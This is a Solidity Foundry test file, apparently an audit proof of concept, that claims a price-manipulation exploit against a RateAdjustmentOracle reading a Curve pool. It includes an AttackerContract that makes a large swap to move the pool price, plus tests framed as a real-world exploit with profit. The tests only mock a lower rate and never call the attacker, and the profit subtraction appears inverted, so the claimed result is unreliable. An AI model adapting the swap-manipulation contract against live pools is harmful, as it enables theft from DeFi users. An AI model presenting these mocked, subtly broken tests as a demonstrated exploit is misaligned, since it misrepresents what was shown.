// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.29;

import "forge-std/Test.sol";
import "forge-std/console.sol";

// Correcciones en las rutas de importación para OpenZeppelin
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IERC4626} from "@openzeppelin/contracts/interfaces/IERC4626.sol";
import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";

// Importaciones internas del proyecto
import {IPrincipalToken} from "../../src/interfaces/IPrincipalToken.sol";
import {IStableSwapNG} from "../../src/interfaces/IStableSwapNG.sol";
import {IRateAdjustmentOracle} from "../../src/interfaces/IRateAdjustmentOracle.sol";
import {RateAdjustmentOracle} from "../../src/amm/RateAdjustmentOracle.sol";
import {RateAdjustmentMath} from "../../src/libraries/RateAdjustmentMath.sol";
import {RayMath} from "../../src/libraries/RayMath.sol";

contract AttackerContract {
    using RayMath for uint256;
    
    address public curvePool;
    address public ibt;
    address public pt;
    
    constructor(address _curvePool, address _ibt, address _pt) {
        curvePool = _curvePool;
        ibt = _ibt;
        pt = _pt;
    }
    
    function manipulatePool(uint256 amount) external {
        // This function would simulate a flash loan attack
        // by swapping a large amount to manipulate the pool price
        
        // Approve tokens for the pool
        IERC20(ibt).approve(curvePool, amount);
        
        // Execute swap to manipulate price
        IStableSwapNG(curvePool).exchange(0, 1, amount, 0);
    }
}

contract OracleManipulationTest is Test {
    using Math for uint256;
    using RayMath for uint256;
    
    RateAdjustmentOracle public oracle;
    address public curvePool;
    address public ibt;
    address public pt;
    AttackerContract public attacker;
    
    // Test parameters
    uint256 public initialPrice = 0.95e18; // 95% of face value
    uint256 public DURATION = 365 days;
    uint256 public initialIBTAmount = 1_000_000e18;
    uint256 public initialPTAmount = 1_000_000e18;
    uint256 public manipulationAmount = 20_000_000e18; // Large amount to manipulate the pool
    
    function setUp() public {
        // Deploy mock contracts
        vm.warp(1000); // Set block timestamp
        
        // Create test addresses
        ibt = makeAddr("ibt");
        pt = makeAddr("pt");
        curvePool = makeAddr("curvePool");
        
        // Setup mocks for the IBT and PT
        vm.mockCall(
            pt,
            abi.encodeWithSelector(IPrincipalToken.maturity.selector),
            abi.encode(block.timestamp + DURATION)
        );
        
        vm.mockCall(
            pt,
            abi.encodeWithSelector(IPrincipalToken.getPTRate.selector),
            abi.encode(initialPrice.toRay())
        );
        
        // Setup mocks for the Curve pool
        vm.mockCall(
            curvePool,
            abi.encodeWithSelector(IStableSwapNG.coins.selector, 0),
            abi.encode(ibt)
        );
        
        vm.mockCall(
            curvePool,
            abi.encodeWithSelector(IStableSwapNG.coins.selector, 1),
            abi.encode(pt)
        );
        
        // Deploy the oracle
        oracle = new RateAdjustmentOracle();
        oracle.initialize(address(this));
        oracle.post_initialize(
            block.timestamp,
            block.timestamp + DURATION,
            initialPrice,
            curvePool
        );
        
        // Deploy the attacker contract
        attacker = new AttackerContract(curvePool, ibt, pt);
    }
    
    function testOracleManipulation() public {
        // Get the normal oracle value
        uint256 normalOracleValue = oracle.value();
        console.log("Normal oracle value:", normalOracleValue);
        
        // Now manipulate the pool price by simulating a large swap
        // Mock a different PT rate to simulate price manipulation
        uint256 manipulatedPrice = 0.75e18; // 75% of face value - significant manipulation
        
        vm.mockCall(
            pt,
            abi.encodeWithSelector(IPrincipalToken.getPTRate.selector),
            abi.encode(manipulatedPrice.toRay())
        );
        
        // Get the manipulated oracle value
        uint256 manipulatedOracleValue = oracle.value();
        console.log("Manipulated oracle value:", manipulatedOracleValue);
        
        // Calculate price impact percentage
        uint256 priceImpact = ((normalOracleValue - manipulatedOracleValue) * 100) / normalOracleValue;
        console.log("Price impact percentage:", priceImpact, "%");
        
        // Assert a significant price manipulation
        assertGt(priceImpact, 5, "Oracle price should be significantly manipulated");
    }
    
    function testRealWorldExploitScenario() public {
        // This test demonstrates a real-world exploit scenario
        
        // 1. Set up initial state
        // We have a protocol function that uses the oracle value for some important operation
        // like determining collateral requirements or liquidation thresholds
        
        // 2. Calculate with normal price
        uint256 normalOracleValue = oracle.value();
        uint256 normalCollateralRequired = calculateCollateralRequired(normalOracleValue, 1000e18);
        console.log("Normal collateral required:", normalCollateralRequired);
        
        // 3. Manipulate the price
        uint256 manipulatedPrice = 0.75e18;
        vm.mockCall(
            pt,
            abi.encodeWithSelector(IPrincipalToken.getPTRate.selector),
            abi.encode(manipulatedPrice.toRay())
        );
        
        // 4. Calculate with manipulated price
        uint256 manipulatedOracleValue = oracle.value();
        uint256 manipulatedCollateralRequired = calculateCollateralRequired(manipulatedOracleValue, 1000e18);
        console.log("Manipulated collateral required:", manipulatedCollateralRequired);
        
        // 5. Show potential profit from the attack
        uint256 potentialProfit = normalCollateralRequired - manipulatedCollateralRequired;
        console.log("Potential profit from manipulation:", potentialProfit);
        
        // Assert significant profit potential
        assertGt(potentialProfit, 0, "Attack should yield profit");
    }
    
    // Helper function to simulate a protocol operation that uses the oracle
    function calculateCollateralRequired(uint256 oracleValue, uint256 loanAmount) internal pure returns (uint256) {
        // Example: Collateral = Loan Amount / Oracle Value * 1.5 (150% collateralization)
        return (loanAmount * 1.5e18) / oracleValue;
    }
}
